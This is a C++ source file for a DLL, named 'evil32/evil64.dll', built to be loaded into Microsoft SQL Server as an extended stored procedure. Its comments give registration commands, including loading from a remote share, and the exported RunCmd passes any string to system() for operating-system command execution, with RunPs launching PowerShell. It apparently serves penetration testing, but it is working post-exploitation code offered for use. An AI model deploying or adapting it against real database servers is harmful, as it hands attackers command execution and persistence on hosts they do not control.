// DllMain.cpp
// Reference: http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure
// Note: Compile for 32 and 64 
// Manual
//  rundll32 evil32.dll,RunCmd
//  rundll32 evil32.dll,RunPs
//  rundll32 evil64.dll,RunCmd
//  rundll32 evil64.dll,RunPs
// Register DLL in SQL Server Examples
//  sp_addextendedproc 'RunCmd', 'c:\Temp\evil32.dll';
//  sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
//  sp_addextendedproc 'RunPs', 'c:\Temp\evil32.dll';
//  sp_addextendedproc 'RunPs', 'c:\Temp\evil64.dll';
//  sp_addextendedproc 'RunPs', '\\server\share\evil64.dll';  :) - DLL doesn't need to be hosted on target system's disk 
// Run Command Examples
//  RunCmd "whoami"
//  RunPs "write-output 'Hellow World' | Out-File c:\temp\file.txt"
// Remove Procedures
//  sp_dropextendedproc 'RunCmd';
//  sp_dropextendedproc 'RunPs';
// Todo: https://technet.microsoft.com/en-us/library/aa197372(v=sql.80).aspx

#include "stdafx.h"			//dllmain.cpp : Defines the entry point for the DLL application.
#include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
#include "shellapi.h"		//needed for ShellExecute          
#include "string"			//needed for std:string  

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	system("echo This is a test. > c:\\Temp\\test_dllmain.txt");
	return 1;
} 

#define RUNCMD_FUNC extern "C" __declspec (dllexport)     
RUNCMD_FUNC int __stdcall RunCmd(const char * Command) {

	// Run OS command with ShellExecute
	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo This is a test. > c:\\Temp\\test_cmd2.txt"), TEXT(" C:\\ "), SW_SHOW);
	
	// Run OS command with system hard coded
	system("echo This is a test. > c:\\Temp\\test_cmd1.txt");

	// Run OS command with system hard coded from variable
	const char *pdata = "echo This is a test. > c:\\Temp\\test_cmd3.txt";
	system(pdata);

	// Run OS command with system from arg
	system(Command);

	return 1;
}

#define RUNPS_FUNC extern "C" __declspec (dllexport)     
RUNPS_FUNC int __stdcall RunPs(const char * Command) {

	// Run PowerShell command	
	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'This is a test.'|out-file c:\\temp\\test_ps2.txt \" "), TEXT(" C:\\ "), SW_SHOW);
	system("PowerShell -C \"'This is a test.'|out-file c:\\temp\\test_ps1.txt\"");

	return 1;
}
